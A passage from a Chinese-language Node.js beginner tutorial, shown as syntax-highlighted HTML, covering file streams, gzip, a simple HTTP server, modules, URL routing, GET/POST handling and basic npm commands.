myReadStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">'data'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"**********"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(chunk);
});

<span class="hljs-comment">//控制台输出结果</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Buffer</span> <span class="hljs-attr">68</span> <span class="hljs-attr">65</span> <span class="hljs-attr">6c</span> <span class="hljs-attr">6c</span> <span class="hljs-attr">6f</span> <span class="hljs-attr">20</span> <span class="hljs-attr">68</span> <span class="hljs-attr">7a</span> <span class="hljs-attr">68</span>&gt;</span>
</span></code></pre>
<p>上述代码读到的是buffer对象，这也是他性能提升的主要原因。如果文件过大，会处理成多个buffer对象</p>
<p>如果想直接读取到数据 ,则可以加一个编码格式 <strong>utf-8</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-keyword">let</span> myReadStream = fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>);<span class="hljs-comment">//新增地方</span>

myReadStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">'data'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"**********"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(chunk);
});
<span class="hljs-comment">//控制台输出结果</span>
hello hzh
</code></pre>
<p>当数据过多,会导致读取还没有完成,就继续下面操作了,因此改变一下写法</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-keyword">let</span> myReadStream = fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>);
<span class="hljs-keyword">let</span> data = <span class="hljs-string">''</span>;
myReadStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">'data'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>){
    <span class="hljs-comment">//用data存储最终数据</span>
    data += chunk;
});
<span class="hljs-comment">// 'end' 当读取完成时在去读取data</span>
myReadStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">'end'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
});
</code></pre>
<p>写入的写法  fs.createWriteStream    myWriteStream.write(data);</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);

<span class="hljs-keyword">let</span> myReadStream = fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>);
<span class="hljs-keyword">let</span> myWriteStream = fs.<span class="hljs-title function_">createWriteStream</span>(__dirname + <span class="hljs-string">"/writeMe.txt"</span>);
<span class="hljs-keyword">let</span> data = <span class="hljs-string">""</span>;
myReadStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">'data'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>){
    data += chunk;
})
myReadStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">'end'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
    myWriteStream.<span class="hljs-title function_">write</span>(data);
});
</code></pre>
<h3 data-id="heading-12">拓展</h3>
<p>有一个 <strong>压缩</strong> 和 <strong>解压</strong> 的操作,是关于服务器开发的操作</p>
<p>压缩</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> zlib = <span class="hljs-built_in">require</span>(<span class="hljs-string">"zlib"</span>);
<span class="hljs-keyword">let</span> myReadStream2 = fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>);
<span class="hljs-keyword">let</span> myWriteStream2 = fs.<span class="hljs-title function_">createWriteStream</span>(__dirname + <span class="hljs-string">"/readMe.txt.gz"</span>);
<span class="hljs-keyword">let</span> gzip = zlib.<span class="hljs-title function_">createGzip</span>();
myReadStream2.<span class="hljs-title function_">pipe</span>(gzip).<span class="hljs-title function_">pipe</span>(myWriteStream2);
</code></pre>
<p>解压</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> zlib = <span class="hljs-built_in">require</span>(<span class="hljs-string">"zlib"</span>);
<span class="hljs-keyword">let</span> myReadStream3 = fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/readMe.txt.gz"</span>);
<span class="hljs-keyword">let</span> myWriteStream3 = fs.<span class="hljs-title function_">createWriteStream</span>(__dirname + <span class="hljs-string">"/readMe2.txt"</span>);
<span class="hljs-keyword">let</span> gunzip = zlib.<span class="hljs-title function_">createGunzip</span>();
myReadStream3.<span class="hljs-title function_">pipe</span>(gunzip).<span class="hljs-title function_">pipe</span>(myWriteStream3);
</code></pre>
<h2 data-id="heading-13">8.Web服务器输出内容</h2>
<p>用的最多的就是用Node构建一个服务器，并且输出内容，内容输出绝大多数为JSON数据</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);
<span class="hljs-keyword">let</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'request'</span>)
}
server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"server is running at http://localhost:3000"</span>);
<span class="hljs-comment">//控制台打印  但需要在浏览器中启动服务器 在地址栏输入 http://localhost:3000</span>
request
</code></pre>
<p>输出 <strong>html</strong> 或者 <strong>纯文本</strong> 格式 {'Content-Type':'text/plain'}</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);
<span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-keyword">let</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>){
    <span class="hljs-keyword">let</span> myReadStream = fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/index.html"</span>,<span class="hljs-string">'utf-8'</span>);
    res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>,
        <span class="hljs-comment">//纯文本、html、json</span>
        {<span class="hljs-string">'Content-Type'</span>:<span class="hljs-string">'text/plain'</span>}
    );
    myReadStream.<span class="hljs-title function_">pipe</span>(res);
})

server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"server is running at http://localhost:3000"</span>);
</code></pre>
<p>解释: .pipe()它的作用是<strong>连接可读流和可写流</strong>，实现数据的自动传输</p>
<p>输出 <strong>json</strong> 格式  {'Content-Type':'application/json'}</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);
<span class="hljs-keyword">let</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>){
    res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>,
        <span class="hljs-comment">//纯文本、html、json</span>
        {<span class="hljs-string">'Content-Type'</span>:<span class="hljs-string">'application/json'</span>}
    );
    <span class="hljs-keyword">let</span> obj = {
        <span class="hljs-attr">name</span>:<span class="hljs-string">'hzh'</span>,
        <span class="hljs-attr">age</span>:<span class="hljs-number">18</span>
    }
    res.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));
})

server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"server is running at http://localhost:3000"</span>);
</code></pre>
<h2 data-id="heading-14">9.模块化</h2>
<p>这个相对简单,就是把一个功能单独给封装起来,使<strong>结构更加清晰</strong>,<strong>方便维护</strong>(下面代码拆分成三个文件:服务器文件、 数据文件、主入口文件)</p>
<p>用 startServer() 方法给代码封装起来 module.exports 导出</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// server.js 服务器文件</span>
<span class="hljs-keyword">let</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);
<span class="hljs-comment">//导入 data.json 文件</span>
<span class="hljs-keyword">let</span> data = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./data.json"</span>)
<span class="hljs-keyword">function</span> <span class="hljs-title function_">startServer</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) {
        res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>,
            { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> }
        );
        res.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
    })

    server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"server is running at http://localhost:3000"</span>);
}
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    startServer
};
</code></pre>
<p>数据也可以进行单独的封装</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// data.json 数据文件</span>
{
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"hzh"</span>,
    <span class="hljs-string">"age"</span>: <span class="hljs-number">18</span>
}
</code></pre>
<p>然后 require  导入 就可以直接使用里面的方法了</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// code.js 主入口文件</span>
<span class="hljs-keyword">const</span> server = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./server'</span>)
server.<span class="hljs-title function_">startServer</span>();
</code></pre>
<h2 data-id="heading-15">10.路由</h2>
<p>在实际的开发场景中，我们需要根据不同的地址返回不同的数据，也就是我们日常所说的路由效果</p>
<p>知识点:request.url ,获取当前路径</p>
<p>如 <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A3000" target="_blank" title="http://localhost:3000" ref="nofollow noopener noreferrer">http://localhost:3000</a> 对应 request.url = "/"  <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A3000%2Fdata" target="_blank" title="http://localhost:3000/data" ref="nofollow noopener noreferrer">http://localhost:3000/data</a> 对应 request.url = "/data"</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);
<span class="hljs-keyword">let</span> data = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./data.json'</span>);
<span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-keyword">function</span> <span class="hljs-title function_">startServer</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">request, res</span>) {
        <span class="hljs-keyword">let</span> url = request.<span class="hljs-property">url</span>;
        <span class="hljs-keyword">if</span> (url === <span class="hljs-string">"/"</span>) {
            res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'text/html'</span> });
            fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/hzh.html"</span>, <span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">pipe</span>(res);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url === <span class="hljs-string">"/data"</span>) {
            res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> });
            res.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
        } <span class="hljs-keyword">else</span> {
            res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">404</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'text/html'</span> });
            fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/404.html"</span>, <span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">pipe</span>(res);
        }
    })
    server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"server is running at http://localhost:3000"</span>);
}
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    startServer
};
</code></pre>
<h2 data-id="heading-16">11.重构路由代码</h2>
<p>上面这个路由还是略微不好,如果我们有一百个接口,全写在 server.js 的话,会十分的臃肿和难维护,所以进行一个重构的操作</p>
<p>新建handler.js文件,该文件专门 <strong>处理具体的业务逻辑和生成响应内容</strong></p>
<p>新建 route.js文件,该文件负责 <strong>URL路由的分发和404处理</strong></p>
<p><strong>思路解析:</strong></p>
<p>把原先的方法单独放在一个模块,解构更加清晰,更易维护</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// server.js</span>
<span class="hljs-keyword">if</span> (url === <span class="hljs-string">"/"</span>) {
            res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'text/html'</span> });
            fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/hzh.html"</span>, <span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">pipe</span>(res);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url === <span class="hljs-string">"/data"</span>) {
            res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> });
            res.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
        } <span class="hljs-keyword">else</span> {
            res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">404</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'text/html'</span> });
            fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/404.html"</span>, <span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">pipe</span>(res);
        }

<span class="hljs-comment">//变成  </span>
<span class="hljs-comment">// handler.js</span>
<span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);

<span class="hljs-keyword">let</span> data = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./data.json'</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">hzh</span>(<span class="hljs-params">response</span>) {
    response.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'text/html'</span> });
    fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/hzh.html"</span>, <span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">pipe</span>(response);
}


<span class="hljs-keyword">function</span> <span class="hljs-title function_">user</span>(<span class="hljs-params">response</span>) {
    response.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> });
    response.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
};


<span class="hljs-keyword">function</span> <span class="hljs-title function_">list</span>(<span class="hljs-params">response</span>) {
    response.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> });
    <span class="hljs-keyword">let</span> lists = {
        <span class="hljs-string">"users"</span>: <span class="hljs-string">"yj"</span>
    };
    response.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(lists));
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    hzh,
    user,
    list
};
</code></pre>
<p>code.js导入  handler 方法,创建 handle 对象 接受 handler 中的函数,然后作为参数传递给 server.startServer 方法,把  route 函数也传递过去</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//code.js</span>
<span class="hljs-keyword">const</span> server = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./server'</span>)
<span class="hljs-keyword">let</span> handler = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./handler'</span>);
<span class="hljs-keyword">let</span> { route } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./router.js'</span>);
<span class="hljs-comment">//用来接受 handler 方法</span>
<span class="hljs-keyword">let</span> handle = {}
<span class="hljs-comment">//赋值</span>
handle[<span class="hljs-string">"/"</span>] = handler.<span class="hljs-property">hzh</span>;
handle[<span class="hljs-string">"/data"</span>] = handler.<span class="hljs-property">user</span>;
handle[<span class="hljs-string">"/list"</span>] = handler.<span class="hljs-property">list</span>;
<span class="hljs-comment">//传递 route,handle 两个参数</span>
server.<span class="hljs-title function_">startServer</span>(route, handle);
</code></pre>
<p>server.js,调用 route 方法 ,并传递三个参数,<strong>handle(路由配置表)</strong>、<strong>request(请求信息)</strong> 和 <strong>res(响应工具)</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">startServer</span>(<span class="hljs-params">route, handle</span>) {
    <span class="hljs-keyword">let</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">request, res</span>) {
       <span class="hljs-comment">//调用方法,传递三个参数给route方法</span>
        <span class="hljs-title function_">route</span>(handle, request, res);
    })
    server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"server is running at http://localhost:3000"</span>);
}
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    startServer
};
</code></pre>
<p>router.js,最终地点路由跳转部分</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">route</span>(<span class="hljs-params">handle, request, response</span>) {
    <span class="hljs-comment">//判断 handle[request.url] 是否在 handler 中有一个函数</span>
    <span class="hljs-comment">//这点需要回顾之前,需要知道这部分 handle["/"] = handler.hzh;而当我们的浏览器地址为 http://localhost:3000 时 request.url = "/"</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> handle[request.<span class="hljs-property">url</span>] === <span class="hljs-string">'function'</span>) {
        <span class="hljs-comment">//如果成功 进入handler.hzh方法中,传递response参数</span>
        handle[request.<span class="hljs-property">url</span>](response);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">//如果handler中没有这个函数 则跳转至404页面</span>
        fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/404.html"</span>, <span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">pipe</span>(response);
    }
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    route
}
</code></pre>
<p><strong>优点:</strong></p>
<ol>
<li><strong>职责分离</strong> - 每个文件有明确单一的责任</li>
<li><strong>易于维护</strong> - 修改业务逻辑只需改handler.js，修改路由只需改route.js</li>
<li><strong>可扩展性</strong> - 添加新路由只需在handler.js添加函数，在code.js注册即可</li>
<li><strong>代码复用</strong> - 路由逻辑和业务逻辑可以独立复用</li>
</ol>
<h2 data-id="heading-17">12.使用GET或POST发送数据</h2>
<p>什么是 <strong>GET</strong>和 <strong>POST</strong>?</p>
<p><strong>GET 的请求目的是从服务器获取资源，这个请求本身不应对服务器数据产生任何副作用。</strong></p>
<p><strong>POST 的请求目的是向服务器提交数据，并期望服务器根据这些数据执行相应的处理（如创建、更新资源，或执行一个会产生副作用的查询）</strong></p>
<p>回顾之前的代码,我们似乎没有做get或者post请求,然并非如此,但我们没有写请求的时候,<strong>默认</strong>是 get 请求的,下面是post请求如何去写</p>
<p>hzh.html</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    跳转至/list页面 发送 post 请求
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/list"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span>&gt;</span>
        name <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"name"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
        password <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"submit"</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//server.js</span>
<span class="hljs-keyword">let</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);
<span class="hljs-keyword">let</span> url = <span class="hljs-built_in">require</span>(<span class="hljs-string">"url"</span>);
<span class="hljs-keyword">let</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">"querystring"</span>);
<span class="hljs-keyword">function</span> <span class="hljs-title function_">startServer</span>(<span class="hljs-params">route, handle</span>) {
    <span class="hljs-keyword">let</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">request, res</span>) {
        <span class="hljs-keyword">let</span> pathname = url.<span class="hljs-title function_">parse</span>(request.<span class="hljs-property">url</span>).<span class="hljs-property">pathname</span>;
        <span class="hljs-keyword">let</span> data = []
        request.<span class="hljs-title function_">on</span>(<span class="hljs-string">'error'</span>, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
            <span class="hljs-comment">//打印错误信息</span>
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err);
            <span class="hljs-comment">//当有数据到达服务器时，data 事件会被触发</span>
        }).<span class="hljs-title function_">on</span>(<span class="hljs-string">'data'</span>, <span class="hljs-function">(<span class="hljs-params">chunk</span>) =&gt;</span> {
            <span class="hljs-comment">//接收数据</span>
            data.<span class="hljs-title function_">push</span>(chunk)
        }).<span class="hljs-title function_">on</span>(<span class="hljs-string">'end'</span>, <span class="hljs-function">() =&gt;</span> {
            <span class="hljs-keyword">if</span> (request.<span class="hljs-property">method</span> === <span class="hljs-string">'POST'</span>) {
                <span class="hljs-comment">//把内容转化成字符串  </span>
                <span class="hljs-keyword">let</span> postData = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">concat</span>(data).<span class="hljs-title function_">toString</span>();
                <span class="hljs-comment">//querystring.parse把 字符串 转化成 对象 形式</span>
                <span class="hljs-title function_">route</span>(handle, pathname, res, querystring.<span class="hljs-title function_">parse</span>(postData));
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">//获取get请求后面的参数 /list?name=abc&amp;age=18 params 就是 { name: 'abc', age: '18' }</span>
                <span class="hljs-keyword">let</span> params = url.<span class="hljs-title function_">parse</span>(request.<span class="hljs-property">url</span>, <span class="hljs-literal">true</span>).<span class="hljs-property">query</span>;
                <span class="hljs-title function_">route</span>(handle, pathname, res, params);
            }
        })


    })
    server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"server is running at http://localhost:3000"</span>);
}
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    startServer
};


</code></pre>
<p>handler.js 中 list 函数</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//handler.js 接受params参数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">list</span>(<span class="hljs-params">response, params</span>) {
    response.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> });
    response.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(params));
}
</code></pre>
<p>router.js</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-comment">//新增 params </span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">route</span>(<span class="hljs-params">handle, request, response, params</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> handle[request] === <span class="hljs-string">'function'</span>) {
        <span class="hljs-comment">//传递params参数</span>
        handle[request](response, params);
    } <span class="hljs-keyword">else</span> {
        fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/404.html"</span>, <span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">pipe</span>(response);
    }
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    route
}
</code></pre>
<h2 data-id="heading-18">13.npm命令</h2>
<h3 data-id="heading-19">安装依赖</h3>
<p>当我们需要第三方的依赖时,可以通过npm进行下载</p>
<pre><code class="hljs">npm install express
</code></pre>
<h3 data-id="heading-20">cnpm镜像</h3>
<p>npm是在远程仓库下载，我们知道他的仓库并不在国内，所以，我们需要找一个国内的仓库镜像</p>
<pre><code class="hljs language-ini" lang="ini">npm install -g cnpm <span class="hljs-attr">--registry</span>=http://registry.npm.taobao.org
</code></pre>
<h3 data-id="heading-21">package.json</h3>
<p>因为node_modules文件依赖文件太多，而且他也不属于我们的源代码，所以我们在上传源代码的时候并不会上传这个文件夹，那么别人如何知道我们安装过了哪些包呢？</p>
<pre><code class="hljs language-csharp" lang="csharp">npm <span class="hljs-keyword">init</span>
</code></pre>
<p>安装依赖时,我们可以在命令行上加入 <strong>--save</strong> 或 <strong>--sage-dev</strong></p>
<pre><code class="hljs language-css" lang="css">npm install <span class="hljs-attr">--save</span> express
npm install <span class="hljs-attr">--save-dev</span> express
</code></pre>
<p>上述两种方法,区别在 <strong>--save</strong> 是生产环境 , <strong>--save-dev</strong> 是开发环境</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"express"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.2.1"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"gulp"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"5.0.1"</span>
  <span class="hljs-punctuation">}</span>
</code></pre>
<p>有了上述描述,我们删除node_modules别人可以使用下述命令直接下载我们之前的依赖包</p>
<pre><code class="hljs">npm install
</code></pre>
<h3 data-id="heading-22">scripts脚本</h3>
<p>我们还有一个scripts脚本可以使用，一个项目的入口文件不是固定的，所以如果别人拿到你的代码，不知道你的入口文件，则无法运行你的项目，下面的脚本可以有效的解决这个问题</p>
